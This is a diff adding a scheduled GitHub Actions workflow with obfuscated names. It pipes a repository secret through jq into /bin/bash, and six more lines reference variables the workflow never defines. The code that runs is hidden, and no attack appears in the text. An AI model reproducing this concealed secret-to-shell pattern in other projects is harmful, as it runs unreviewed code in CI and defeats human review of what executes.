@@ -1,0 +1,25 @@
+name: lingfudianhuang
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '25 4/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: lingfudianhuang
+        env:
+          qyqos0: ${{ secrets.qyqos0 }}
+        run: |
+          echo $qyqos0 | jq -r .j210 | /bin/bash
+          echo $nam3779 | jq -r .ay146 | /bin/bash
+          echo $mntv315 | jq -r .ncn422 | /bin/bash
+          echo $dbg16618 | jq -r .ws7509 | /bin/bash
+          echo $z4774 | jq -r .bsqd9465 | /bin/bash
+          echo $gyrky46 | jq -r .yqvqh57014 | /bin/bash
+          echo $a85481 | jq -r .ugwo4284 | /bin/bash
+
